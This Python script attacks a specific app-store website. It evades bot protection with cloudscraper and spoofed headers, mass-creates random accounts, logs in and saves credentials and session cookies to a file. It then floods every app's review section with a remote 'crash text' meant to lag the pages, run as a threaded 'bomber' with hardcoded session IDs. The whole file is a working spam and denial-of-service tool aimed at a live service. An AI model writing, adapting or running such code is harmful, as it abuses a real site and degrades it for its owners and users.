import os

try:
    from cloudscraper import create_scraper
    from fake_headers import Headers
    from bs4 import BeautifulSoup
    from threading import Thread
    import requests
    import string
    import random

except ImportError:
    to_install = ['cloudscraper','fake_headers','bs4','requests']
    os.system('pip install '+' '.join(to_install))
    print('Pls restart')
strings = string.ascii_letters

host = 'https://vaistore.gq/'
with create_scraper() as s:
  scraper = s.get('https://vaistore.gq/').text
apps = []

soup = BeautifulSoup(scraper, 'lxml')
temp = soup.find_all('a',href=True)
for i in temp:
    temp = str(i['href']).find('?AppID=')
    slice = int(temp)+len('?AppID=')
    if '/' not in str(i['href'][slice:]):
        apps.append(str(i['href'][slice:]))

crash_text = requests.get('https://www.klgrth.io/paste/hr6dc/raw').text #text to lag in comments

def get_list_of_errors():
  with create_scraper() as s:
    for i in range(1,10+1):
      scraper = s.get('https://vaistore.gq/Pages/ErrorPage.php?Code='+str(i)).text
      soup = BeautifulSoup(scraper, 'lxml')
      error = soup.find_all('div',class_='Error_Text')
      print(str(error[0].text)+'\nCode='+str(i))
#get_list_of_errors()#fuction to get all errors

#headers here
def random_header():
  header = Headers(browser="chrome",os="win",headers=True)
  return header.generate()

# Main

def create_akk(save: bool):
    random_nickname = ''.join(random.choices(strings,k=13))
    random_login = ''.join(random.choices(strings,k=13))
    random_pass = ''.join(random.choices(strings,k=13))
    with create_scraper() as s:
      reqeust = s.post(host+'vai_acc_sys/login_system/reg_sys.php',data={
'nikname':random_nickname,
'login':random_login,
'pass':random_pass,
'login_vacc':'Создать'
    })
      out = ['Saved and Account reg: '+str(reqeust.status_code)+' '+random_login+' '+random_pass,[random_login,random_pass]]
      if not save:
        return out
      elif save:
        with open('accounts.txt','a') as f:
          f.write('Account reg: '+str(reqeust.status_code)+' '+random_login+' '+random_pass+'\n')
        return out

session_id_old = None
php_id_old = None

def enter_account(login,password,save):
  global session_id_old,php_id_old
  with create_scraper() as s:
    with requests.Session() as sus:
      if session_id_old!=None:
        exit = sus.get(host+'vai_acc_sys/login_system/exit.php',cookies={
            'SessionID':session_id_old
        },headers=random_header())
      log = sus.post(host+'vai_acc_sys/login_system/login_sys.php',data={
            'login':login,
            'pass':password,
            'login_vacc':'Войти'
        },headers=random_header())
      try:
        sessionid = sus.cookies.get_dict()['SessionID']
        phpid = sus.cookies.get_dict()['PHPSESSID']
      except KeyError:
        pass
      else:
        session_id_old = sessionid
        php_id_old = phpid
        out = [sessionid,phpid]
        if not save:
          return out
        elif save:
          with open('accounts.txt','a') as f:
            f.write('-------------\nLogin to account: '+login+' '+password+'\nSessionID: '+sessionid+'\nPHPID: '+phpid+'\n-------------\n')
          return out
          

def sendreviews(sessionid: str,phpid: str):
  for i in apps:
      reqeust123 = requests.post(host+'vai_acc_sys/system/AddReview.php?AppID='+i,cookies={
  'PHPSESSID': str(phpid),
  'SessionID':str(sessionid)

      },data={
  'ReviewText':crash_text,
  'Post_Review':''
      },headers=random_header(),allow_redirects=False)
      print('Send review: '+str(reqeust123.status_code)+' To app: '+i)

'''
for i in range(3):
  send = create_akk(True)#if true accounts save in file accounts.txt
  print(send[0])
  log = enter_account(send[1][0],send[1][1],True)
  try:
    print('Log to account: \nSessionID: '+log[0]+'\nPHPID: '+log[1])
    sendreviews(log[0],log[1])
  except TypeError:
    if input('Exit: ') in ['yes','y','true','t','д','да']:
        exit()
    else:
      quit()
'''

for i in range(1):#Threads
  class GG(Thread):
    def run(self):#Run bomber
      print(create_akk(True))
      print(sendreviews('c04379e3a209b2ae8118e63234332057','boopbfa1ss0lnunq0ur50bkc64'))
  gg = GG()
  gg.start()#run thread
